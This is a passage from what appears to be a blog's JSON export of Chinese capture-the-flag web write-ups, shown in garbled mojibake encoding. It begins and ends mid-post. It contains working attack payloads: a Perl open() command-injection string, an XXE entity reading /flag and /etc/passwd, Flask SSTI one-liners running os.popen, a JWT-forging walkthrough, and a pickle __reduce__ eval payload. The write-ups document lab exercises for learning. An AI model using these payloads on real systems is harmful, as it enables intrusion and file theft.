ä¸ºä»€ä¹ˆè¦æäº¤ä¸¤æ¬¡å‘¢\n\nå› ä¸ºå‰é¢è¯´è¿‡ file åè®®åˆ©ç”¨ open å‘½ä»¤æ‰§è¡Œ,è¦æ‰§è¡Œçš„å‘½ä»¤å…ˆå‰å¿…é¡»è¦æœ‰ä»¥å‘½ä»¤ä¸ºæ–‡ä»¶åçš„æ–‡ä»¶å­˜åœ¨ \n\nç„¶åè¿™é‡Œä¸ºä»€ä¹ˆè¦åŠ åæ–œæ å‘¢ å› ä¸ºç®¡é“ç¬¦éœ€è¦æˆ‘ä»¬å»è½¬ä¹‰ä¸€ä¸‹\n\nå› æ­¤ç¬¬ä¸€æ¬¡æäº¤ æ˜¯è®©å»åˆ›å»ºä¸€ä¸ªä»¥å‘½ä»¤ä¸ºæ–‡ä»¶çš„æ–‡ä»¶  ç¬¬äºŒæ¬¡æ‰å»æ‰§è¡Œå¹¶ä¸”å°†æ‰§è¡Œç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­å»\n\nç„¶åå†æ ¹æ®æˆ‘ä»¬çš„ip å»æ„é€ æ²™ç›’è·¯å¾„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655416854-884aeaf3-67e1-4957-8fec-aecb1fef681e.png)\n\næ„é€ payloadè®¿é—®ï¼š`/sandbox/2eeed2f9aeae6311b507ada8fb98809e/ls \\|`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655471087-d0091932-4b56-4371-bdb7-0912c0535f48.png)\n\nçœ‹åˆ°æœ‰ä¸ªreadflag ç†è®ºæ¥è¯´ç›´æ¥æ‰§è¡Œ`./readflag`å°±å¯ä»¥äº† ä½†æ˜¯è¿™é‡Œä¸è¡Œ æˆ‘ä»¬è¦é€šè¿‡æ„é€ ä¸€ä¸ªä»¥å‘½ä»¤ä¸ºæ–‡ä»¶åçš„æ–‡ä»¶ç„¶åå»è®¿é—® å¦‚æœè¿™é‡Œæ„é€ ï¼š`/readflag`æ–‡ä»¶æ˜¯æ‰§è¡Œä¸äº†çš„ å› ä¸ºè¿™é‡Œå¿…é¡»æ˜¯`/readflag|` æ‰èƒ½æˆåŠŸæ‰§è¡Œ ä½†æ˜¯readflag| ä¸æ˜¯readflagæ–‡ä»¶å°±ç®—æ‰§è¡Œäº†ä¹Ÿæ²¡ç”¨\n\nå†è¯´ä¸€å¥ ä¸€èˆ¬è§åˆ°readflagè¿™æ ·çš„æ–‡ä»¶åå­— ç›´æ¥å»æ‰§è¡Œ è€Œä¸æ˜¯å»é€šè¿‡catè¿™æ ·çš„å‘½ä»¤å»è¯» å› ä¸ºreadflagé‡Œé¢æ˜¯ä»£ç  ç›´æ¥`./`æ‰§è¡Œå°±è¡Œäº†\n\næ„é€ ï¼š`?url=file:bash -c /readflag|&filename=bash -c /readflag|` ä¹Ÿæ˜¯å’Œä¸Šé¢ä¸€æ ·æ‰§è¡Œä¸¤æ¬¡ç„¶åé€šè¿‡è·¯å¾„å»è®¿é—®å°±å¯ä»¥æ‹¿åˆ°flagäº†\n\nè¿™é‡Œç”¨çš„`bash -c` ä¹Ÿå°±æ˜¯å°†åé¢å­—ç¬¦ä¸²å½“ä½œå‘½ä»¤è¯»å…¥æ‰§è¡Œ ç„¶åè¾“å‡º\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679657151543-97b24931-a4a4-45ad-9f6e-2dcc37ef39d4.png) ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679657191148-69954b67-5aa4-4516-a440-2b628bb97fca.png)\n\næˆåŠŸï¼\n","tags":["ssrf","perl"],"categories":["buuctf"]},{"title":"buuctf-74-[NCTF2019]True XML cookbook.txt","url":"/post/e8a597ec.html","content":"\n[NCTF2019]True XML cookbook.txt\n\n<!--more-->\n\n## ç¢ç¢å¿µï¼š\n\nè¿™é“é¢˜è€ƒå¯Ÿäº†xmlå’Œxxeï¼Œå…¶å®æ”»å‡»æ‰‹æ®µæ‰‹æ®µæ˜¯xxeï¼Œä¸€å¼€å§‹åšè¿™é“é¢˜ä¸€ç›´æ²¡å¤ç°å‡ºæ¥ï¼Œbpçˆ†ç ´æ¨¡å—ä¸€ç›´ä¸åŠ¨ï¼Œä¹‹åç”¨äº†pythonè„šæœ¬ä¹Ÿä¸è¡Œï¼Œå°±æ”¾å¼ƒäº†ï¼Œç¬¬äºŒå¤©ä¸­åˆåœ¨è¯•äº†ä¸€æ¬¡ï¼Œç»ˆäºæˆåŠŸäº†ï¼ŒçœŸç„å­¦ã€‚åšä¹‹å‰ä¹Ÿæ˜¯å»è¡¥äº†ä¸€ä¸‹xxeçš„çŸ¥è¯†ï¼ŒçœŸä¸é”™ã€‚\n\n## è§£é¢˜ï¼š\n\nè¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œå‘ç°æˆ‘ä»¬çš„ç™»å½•åä¼šæ˜¾ç¤ºåœ¨ç•Œé¢ä¸Š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643576603-ba19db5b-007b-446c-82f3-10ac758b00cc.png)\n\nä¹‹å‰buuæœ‰é“é¢˜ä¹Ÿæ˜¯å’Œè¿™é“é¢˜ç›®ä¸€æ ·çš„uiï¼Œç›´æ¥å¥—ç”¨ä¸Šé“é¢˜ç›®çš„è§£é¢˜ç­”æ¡ˆï¼Œå‘ç°è‚¯å®šä¸è¡Œã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643711572-da9bff85-1876-406d-ad6d-69dddb2fd2f5.png)\n\né¦–å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªpayloadæ„æˆ\n\nç¬¬ä¸€è¡Œ`<?xml version=\"1.0\"  encoding=\"UTF-8\" ?>`è¿™ä¸€è¡Œè¡¨ç¤ºäº†è¿™æ˜¯xmlçš„æ–‡æ¡£æ˜¾ç¤ºäº†ç‰ˆæœ¬ä¿¡æ¯å’Œç¼–ç æ ¼å¼\n\næœ€é‡è¦çš„ä¸€éƒ¨åˆ†ï¼š\n\n```\n<!DOCTYPE username [\n<!ENTITY aaa SYSTEM \"file:///flag\"> ]>\n```\n\nè¿™æ˜¯DTDï¼Œç”¨æ¥è§„èŒƒxmlçš„æ–‡æ¡£æ ¼å¼ `username`ä¸ºæ ¹å…ƒç´  æ¯ä¸ªxmlæ–‡æ¡£éƒ½è¦æœ‰ä¸€ä¸ªæ ¹å…ƒç´ ï¼Œå¹¶ä¸”æœ‰ä¸”åªæœ‰ä¸€ä¸ªï¼Œç„¶å`aaa`æ˜¯æˆ‘ä»¬å®šä¹‰çš„ä¸€ä¸ªå®ä½“ï¼Œå¹¶ä¸”è¿™é‡Œ`SYSTEM`è¡¨ç¤ºæ˜¯å¤–éƒ¨å®ä½“ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆxxeå«åšå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨å¤–éƒ¨å®ä½“æ¥è¾¾åˆ°æˆ‘ä»¬é¢„æœŸçš„ä¸€ä¸ªæ”»å‡»æ‰‹æ®µã€‚å…¶å®è¿™é‡ŒæŠŠä»–ç†è§£ä¸ºæ˜¯ä¸€ä¸ªå˜é‡å°±å¯ä»¥ä¹‹åæ˜¯`aaa`è¿™ä¸ªå®ä½“çš„å€¼ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªfileåè®®ï¼Œæ²¡é”™xxeå¯ä»¥ä¸ä¼ªåè®®ä¸€èµ·æ­é…ä½¿ç”¨å»æ¶æ„è¯»ä¸€äº›æ–‡ä»¶å†…å®¹ã€‚  å…·ä½“å¯ä»¥çœ‹è¿™é‡Œï¼šhttps://xz.aliyun.com/t/3357#toc-0 æ€»ç»“çš„å¾ˆåˆ°ä½\n\nç„¶åé€šè¿‡ `&å®ä½“åç§°;` çš„æ–¹å¼æ¥è°ƒç”¨è¿™ä¸ªæˆ‘ä»¬åˆ›å»ºçš„å®ä½“ã€‚\n\nç„¶åä¹‹åå°±ä¸æ‡‚äº† ï¼Œæ…¢æ…¢çš„å»çœ‹å¤§ä½¬çš„wpå»å­¦ä¹ \n\nä¹‹åå¯ä»¥é€šè¿‡filterä¼ªåè®®å»è¯» index.phpçš„å†…å®¹ä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆç”¨\n\nç„¶åè¿™é“é¢˜çš„æ€è·¯æ˜¯é€šè¿‡xxeå»æ¢æµ‹å†…ç½‘ å‚è€ƒï¼šhttps://blog.spoock.com/2019/10/08/proc/\n\nhttps://www.cnblogs.com/secutity-zbk/p/14789043.html\n\n- /etc/hosts å‚¨å­˜åŸŸåè§£æçš„ç¼“å­˜\n- /etc/passwd ç”¨æˆ·å¯†ç \n- /proc/net/arp  åœ°å€è§£æçš„å†…æ ¸ARPè¡¨çš„ä¿¡æ¯  \n- /proc/net/fib_trie è·¯ç”±ç¼“å­˜\n\næ‰«ä¸€ä¸‹åŸŸåè§£æç¼“å­˜\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644669966-630764be-85ba-49fd-ae15-4972d217180d.png)\n\næ‰«ä¸€ä¸‹ç”¨æˆ·ç™»å½•çŠ¶æ€å¯†ç å•¥çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644749032-70eded58-fd1c-433f-b3f9-0df596e95e13.png)\n\nå‘ç°éƒ½å¯ä»¥æ‰«åˆ°\n\nå»æ‰«è§£æçš„åœ°å€å’Œè·¯ç”±ç¼“å­˜ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644874065-fa187595-bd78-4376-9b6c-5f4bbd6bf4b9.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644939819-489e3110-fb7b-4962-8207-21c8754032c0.png)\n\nå‘ç°å¯ç–‘ipï¼Œç›´æ¥è¿›è¡Œhttpåè®®è¯»ip\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679645074091-dea2c2c1-2834-4809-a4a1-dad93bbb8423.png)\n\nå‘ç°ä¸è¡Œï¼Œçœ‹äº†å¤§ä½¬çš„wpæ˜¯å› ä¸ºcæ®µipä¸æ­£ç¡®ï¼Œä¹Ÿå°±æ˜¯129è¿™é‡Œä¸å¯¹ï¼Œå¥½åƒæ˜¯è®¡ç®—æœºç½‘ç»œçš„çŸ¥è¯†ï¼Œè¿™é‡Œå°±ä¸æ·±ç©¶äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œç›´æ¥ç”¨bpçš„çˆ†ç ´æ¨¡å—å°±è¡Œï¼Œå°±æ˜¯è¿™é‡Œä¸€å¼€å§‹æ²¡åšå‡ºæ¥ï¼Œå¥½åƒæ˜¯é¢˜ç›®é—®é¢˜ï¼Œç¬¬äºŒå¤©ç»ˆäºåšå‡ºæ¥äº†\n\nå½“ç½‘æ®µæ­£ç¡®æ—¶ï¼Œæ‹¿åˆ°flagã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643489111-d7a23ddc-2bb6-46c7-b5d0-436cb2e227ee.png)\n","tags":["xxe","å†…ç½‘"],"categories":["buuctf"]},{"title":"buuctf-73-[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–","url":"/post/490aa04.html","content":"\n[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–\n\n<!--more-->\n\n## ç¢ç¢å¿µï¼š\n\nè¿™é“é¢˜æ˜¯ä¸€é“å…³äºä¼ªé€ ä¼ªéšæœºæ•°çš„é¢˜ç›®ï¼Œä¹‹å‰ä»æœªæ¥è§¦è¿‡ï¼Œè¿™æ¬¡æ¥è®°å½•ä¸€ä¸‹\n\n## è§£é¢˜ï¼š\n\nè¿›å…¥é¢˜ç›®ä¹‹åæŸ¥çœ‹æºç  å‘ç°`check.php`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483023667-c996906b-3fbe-417a-baaa-47e01e22b92f.png)\n\nå‘ç°æºç ï¼š\n\n```plain\n<?php\n#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼\nheader(\"Content-Type: text/html;charset=utf-8\");\nsession_start();\nif(!isset($_SESSION['seed'])){\n$_SESSION['seed']=rand(0,999999999);\n}\n\nmt_srand($_SESSION['seed']);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\n$str_show = substr($str, 0, 10);\necho \"<p id='p1'>\".$str_show.\"</p>\";\n\n\nif(isset($_POST['num'])){\n    if($_POST['num']===$str){x\n        echo \"<p id=flag>æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}</p>\";\n    }\n    else{\n        echo \"<p id=flag>æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§</p>\";\n    }\n}\nshow_source(\"check.php\");\n```\n\næ€»ä½“åˆ†æä¸€ä¸‹å°±æ˜¯æˆ‘ä»¬è¦è¾“å…¥ä¸€ä¸ªnumå‚æ•° å½“numç­‰äºä»–äº§ç”Ÿçš„éšæœºé•¿ä¸º20çš„å­—ç¬¦ä¸² å°±èƒ½æ‹¿åˆ°flag\n\nmt_srand() \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483191710-fb814299-27a1-4fe9-8795-4f860a7848e9.png)\n\nç®€å•è¯´å°±æ˜¯è¿™ä¸ªå‡½æ•°ç»™mt_rand()å‡½æ•°æä¾›ä¸€ä¸ªç§å­ ç„¶åmt_rand()å‡½æ•°å»ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½†æ˜¯è¿™ä¸ªéšæœºæ•°å…¶å®æ˜¯ä¸€ä¸ªä¼ªéšæœºæ•°\n\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½ç ´è§£å‡ºè¿™ä¸ªç§å­ è¿™é“é¢˜ç›®å°±è¿åˆƒè€Œè§£äº†\n\nè¿™é‡Œè¦ç”¨åˆ°php_mt_seedè„šæœ¬å»ç ´è§£è¿™ä¸ªç§å­  è„šæœ¬ä¸‹è½½åœ°å€ï¼šhttps://www.openwall.com/php_mt_seed/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483395438-3f102fcd-eb70-4556-b7ce-21a5d383ad02.png)\n\nç„¶åè£…åˆ°æˆ‘çš„kaliä¸Š\n\nå…ˆmake ä¸€ä¸‹\n\nè¿™é‡Œmakeä¸€å¼€å§‹ä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ç„¶åå»æŸ¥äº†æŸ¥è¿˜æ˜¯æœ‰ä¸œè¥¿çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483549317-739c5e85-a900-42c3-a7d6-c296871ac8be.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483489104-33b48267-83cc-452b-90ce-84b89fb3431a.png)\n\nç„¶åè¿™ä¸ªè„šæœ¬è¦å…ˆæŠŠè¿™å­—ç¬¦ä¸²è½¬åŒ–ä¸ºä¸€ä¸ªå¯è¯†åˆ«çš„æ•°åˆ—\n\npythonè„šæœ¬å¦‚ä¸‹:\n\n```plain\nstr1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nstr2='QJlBBqs6ji'\nstr3 = str1[::-1]\nlength = len(str2)\nres=''\nfor i in range(len(str2)):  \n    for j in range(len(str1)):\n        if str2[i] == str1[j]:\n            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '\n            break\nprint(res)\n```\n\nä½†æ˜¯æˆ‘æ²¡æœ‰ææ‡‚è¿™ä¸ªè„šæœ¬çš„ç›®çš„å’ŒåŸç†\n\nè¿›è¡Œçˆ†ç ´ å‘ç°ç§å­ è¿™é‡Œè°ƒç”¨è„šæœ¬é€šè¿‡`./`è°ƒç”¨å…¶å®å°±æ˜¯è¿è¡Œè¯¥è„šæœ¬çš„æ„æ€\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483685459-9dc379c9-56ce-4f7e-a035-954752ed1f4c.png)\n\nå†æ ¹æ®è¿™ä¸ªç§å­ é‡æ–°ç”Ÿæˆé¢˜ç›®ä¸­çš„å­—ç¬¦ä¸² ç›´æ¥ç”¨é¢˜ç›®çš„ä»£ç ç¨åŠ ä¿®æ”¹å°±è¡Œ\n\nè„šæœ¬å¦‚ä¸‹ï¼š\n\n```plain\n<?php\nmt_srand(672026733);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\necho $str;\n?> \n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483730008-bc495859-079b-47ec-b4cb-835e4a636a22.png)\n\næ‹¿åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483777454-45feaed2-b77a-4171-be81-e44f5bae654d.png)\n","tags":["ä¼ªéšæœºæ•°"],"categories":["buuctf"]},{"title":"buuctf-72-[CSCCTF 2019 Qual]FlaskLight","url":"/post/8df15d0e.html","content":"\n[CSCCTF 2019 Qual]FlaskLight\n\n<!--more-->\n\nä¸€çœ¼ä¸çœŸ flaskçš„ssti\n\nè¿™é“é¢˜å‡ ä¹æ²¡æ€ä¹ˆè¿‡æ»¤ payloadéšä¾¿åœ¨ç½‘ä¸Šæ‰’å°±è¡Œäº†\n\nä½†æ˜¯ä¸çŸ¥é“è¶…çº§æ— æ•Œè„šæœ¬æ€ä¹ˆä¼šæŠ¥é”™ åªèƒ½æ‰‹åŠ¨å»æ³¨å…¥äº†\n\nè®°å½•ä¸€ä¸‹å„ç§payloadçš„å§ è¿™é“é¢˜å¦‚æœç›´æ¥ç”¨`__globals__`ä¼šæŠ¥é”™å¯èƒ½æ˜¯è¢«å±è”½äº†ï¼Œé€šè¿‡æ‹¼æ¥ç»•è¿‡å°±è¡Œäº†\n\nè¿™äº›æ˜¯æ¯”è¾ƒç®€å•çš„payloadï¼š\n\n1. `?search={{config.__init__['__global'+'s__'].os.popen(\"cmd\").read()}}`\n2. `?search={{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval'](\"__import__('os').popen('cmd').read()\")}}`\n","tags":["python","flaskæ¡†æ¶"],"categories":["buuctf"]},{"title":"buuctf-71-[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun","url":"/post/8a6d07e1.html","content":"\n[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun\n\n<!--more-->\n\n## ç¢ç¢å¿µï¼š\n\nä¸€é“å…³äºjwtå’Œpythonååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œå¯¹æˆ‘æ¥è¯´å¾ˆæ–°é¢–ï¼Œæš‚æ—¶åªä¼šphpçš„ååºåˆ—åŒ–ï¼Œå°±å½“ä½œå­¦ä¹ é¢˜ç›®äº†ï¼Œç„¶åè¶Šåšåˆ°åé¢çš„é¢˜ç›®å‘ç°ä¼špythonè„šæœ¬å¹²ä¸€äº›æœºæ¢°é‡å¤æ€§çš„äº‹æƒ…çœŸçš„å¾ˆæœ‰ç”¨ï¼Œå¾—æ‰¾æ—¶é—´å»å­¦ç€å†™è„šæœ¬ã€‚\n\n## è§£é¢˜ï¼š\n\nè¿›å…¥é¢˜ç›®\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679473847087-0169d116-8a33-4976-bd55-f371017157d8.png)\n\nçœ‹è¿‡æºç ä¸€äº›æ­£å¸¸æ“ä½œä¹‹åä»€ä¹ˆä¹Ÿæ²¡å‘ç°ï¼Œçœ‹åˆ°ä¸€å¥è¯ï¼Œåº”è¯¥æ˜¯è®©æˆ‘ä»¬ä¹°lv6ï¼Œåœ¨è¿™ä¹‹å‰å…ˆå»æ³¨å†Œç™»å½•ï¼Œç„¶åæ—¥å¸¸çœ‹ä¸€ä¸‹adminçš„ç”¨æˆ·ï¼Œå‘ç°æ˜¯å·²ç»æ³¨å†Œè¿‡çš„ã€‚\n\nä¸€å¼€å§‹æˆ‘éƒ½æ˜¯ä¸€é¡µä¸€é¡µçš„åœ¨æ‰¾ï¼Œå‘ç°æ‰¾äº†10å‡ é¡µéƒ½æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±æ„Ÿè§‰ä¸å¯¹åŠ²äº†ï¼Œç„¶åçœ‹äº†å¤§ä½¬çš„wpï¼Œå‘ç°è¦ç”¨è„šæœ¬å»æ‰¾ï¼Œæœ€åpage=181ï¼Œæˆ‘çœŸçš„äººéƒ½å‚»äº†\n\nè¿™é‡Œæ”¾ä¸‹å¤§ä½¬çš„è„šæœ¬\n\n```plain\nimport requests\n\nimport time\n\nfor i in range(1,200):\n\n    time.sleep(0.8)\n\n    print(i)\n\n    url = 'http://ca5b02fb-d09b-45b9-b0ff-a14785826592.node3.buuoj.cn/shop?page={}'.format(i)\n\n    r = requests.get(url)\n\n    if 'lv6.png' in r.text:\n\n        print(\"æ‰¾åˆ°lv6-----{}\".format(i))\n\n        break\n```\n\nå…¶å®è¿™ä¸ªè„šæœ¬è¿˜æ˜¯è›®å®¹æ˜“ç†è§£çš„ï¼Œå°†é¡µæ•°æ ¼å¼åŒ–ï¼Œè®©åä¸€ç›´å¾ªç¯ï¼Œå½“è¯¥é¡µé¢å­˜åœ¨`lv6.png`å†…å®¹æ—¶ï¼Œå°±è¯´æ˜æ‰¾åˆ°äº†\n\nä½†æ˜¯è¿™é‡Œè¦æ³¨æ„ï¼Œä¸€å®šè®©è„šæœ¬æš‚åœ0.8ç§’ï¼Œå› ä¸ºbuuä¼šé˜²çˆ¬\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474702762-160ddbe0-fb42-4be9-8366-724c99159d5b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474338539-15f8f312-2c1b-4634-a335-e851b7b615de.png)\n\næ‰¾åˆ°ä¹‹åå‘ç°è¿™ä¸ªé’±æ•°æˆ‘ä»¬ä¹°ä¸äº†ï¼ŒæŠ“åŒ…æŸ¥çœ‹ï¼Œå‘ç°æœ‰æŠ˜æ‰£\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474379880-aa279a5f-7795-4149-898f-7a5b6e3e7554.png)\n\nç›´æ¥ä¿®æ”¹ä¸€ä¸‹ï¼Œå‘ç°é¡µé¢è·³è½¬äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474405099-6658c1fd-c0b6-4f9a-82df-b7676aa6ea26.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474429619-3a0c3aa1-a290-4dc3-a611-ae624ea29688.png)\n\nåªå®¹è®¸adminè®¿é—®ï¼Œè¿™ä¹Ÿåº”å°è¯äº†ä¹‹å‰æ³¨å†Œçš„æ—¶å€™adminå·²ç»è¢«æ³¨å†Œè¿‡\n\næŠ“åŒ…åˆ†æä¸€ä¸‹ï¼Œè¿™é‡Œå°±æ˜¯å…³äºjwtçš„çŸ¥è¯†ç‚¹äº†ï¼Œå‚è€ƒï¼šhttps://www.cnblogs.com/cjsblog/p/9277677.html\n\nå°±æˆ‘ä¸ªäººè®¤ä¸ºï¼Œç±»ä¼¼äºæˆ‘ä»¬å¹³å¸¸åšé¢˜çš„php sessionç”¨äºè®°å½•å½“å‰ç™»å½•ç”¨æˆ·ä¼šè¯ä¿¡æ¯\n\né‚£ä¹ˆå¼„æ˜ç™½ä¹‹åå°±è¯•ç€å»ä¼ªé€ è¿™ä¸ªjwtï¼ŒæŠŠæˆ‘ä»¬çš„jwtä¼ªé€ æˆadminçš„é‚£ä¹ˆä¸å°±å¯ä»¥æˆåŠŸå˜›\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474509525-bb77812e-6b29-47af-9b35-e4030eef9816.png)\n\nå…ˆå°†è¿™ä¸ªjwtå­—ç¬¦ä¸²ç»™ å¼„å›åŸæ¥çš„æ¨¡æ · è¿™é‡Œæœ‰ä¸ªå·¥å…·ï¼šhttps://jwt.io/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474884435-1df5d5ae-3d04-4797-973c-28d07ddacbbf.png)\n\nå‘ç°å­˜åœ¨æˆ‘ä»¬ç™»å½•åç§°ï¼Œç›´æ¥æ”¹ä¸ºadminï¼Œå†æŠ“åŒ…å¯ä»¥å˜›ï¼Œç†è®ºå¯ä»¥ï¼Œä½†æ˜¯è¿™é‡Œè¿˜å­˜åœ¨ä¸€ä¸ªkeyï¼Œå¿…é¡»æ‹¿åˆ°è¿™ä¸ªkeyæ‰èƒ½å†åç¼–è¯‘å›å»ç¬¦åˆä»–çš„è¦æ±‚ï¼Œè¿™é‡Œå°±æœ‰ä¸ªæš´åŠ›ç ´è§£jwt keyçš„è„šæœ¬ https://github.com/brendan-rius/c-jwt-cracker\n\næˆ‘ç›´æ¥æ˜¯æ”¾åœ¨kaliç¯å¢ƒä¸‹äº†ï¼Œå› ä¸ºè¿˜è¦é…ç½®dockerç¯å¢ƒï¼Œç¯å¢ƒé…ç½®å¥½ä»¥åï¼Œé‡Œé¢æœ‰ä¸ªæ–‡ä»¶è¯´æ˜ï¼Œçœ‹çœ‹å°±ä¼šä½¿ç”¨ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475165344-5aead3f4-8bbd-47b7-97e8-5e6c22972de8.png)\n\næ³¨æ„è¦ç”¨rootèº«ä»½ çˆ†å‡º keyä¸º `1Kun` \n\nç°åœ¨å°†ç”¨æˆ·æ¢ä¸º `admin` keyä½¿ç”¨ `1Kun`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475274835-d6c1dca3-27df-4561-89ed-a8aec4f676ad.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475309325-035236f5-1a7f-49c8-a173-ad59fad9498c.png)\n\nç„¶åæŸ¥çœ‹æºç  å‘ç°ä¸€ä¸ªå‹ç¼©åŒ…\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475357662-942c80ce-c9b9-4d58-9db6-4f749ac6cfd4.png)\n\nä¸‹è½½ä¸‹æ¥ \n\nçœ‹äº†å¤§ä½¬çš„wp å‘ç°Admin.pyå­˜åœ¨ååºåˆ—åŒ–æ¼æ´\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475402464-72d76905-3a4f-4dee-ba61-e28208f05db6.png)\n\næºç é™„ä¸Šï¼š\n\n```plain\nimport tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))\n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n```\n\nè¿™é‡Œçš„pickleæ¨¡å—åº”è¯¥å°±æ˜¯å±äºpython çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¨¡å—\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475553228-e58261a6-ee61-458f-ab34-317dd22fdd73.png)\n\nçœ‹åˆ°becomeå­˜åœ¨ååºåˆ—åŒ– é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åƒphpååºåˆ—åŒ–æ¼æ´ä¸€æ · æ„é€ è¯»flagçš„åºåˆ—åŒ–å­—ç¬¦ä¸² ç„¶åä¼ ç»™becomeå°±å¯ä»¥è·å¾—flagäº†\n\næœ¬åœ°æ„é€ ï¼š\n\n```plain\nimport pickle\nimport urllib\n\nclass payload(object):\n    def __reduce__(self):  ##å½“pickleå¯¹è±¡è¢«è°ƒç”¨æ—¶è‡ªåŠ¨æ‰§è¡Œ\n       return (eval, (\"open('/flag.txt','r').read()\",)) ##æ³¨æ„è¦æ˜¯å…ƒç»„\n\na = pickle.dumps(payload())  ##å¦‚æœå¯¹pickleä¸ç†è§£å¯è‡ªè¡Œç™¾åº¦\na = urllib.quote(a)\nprint 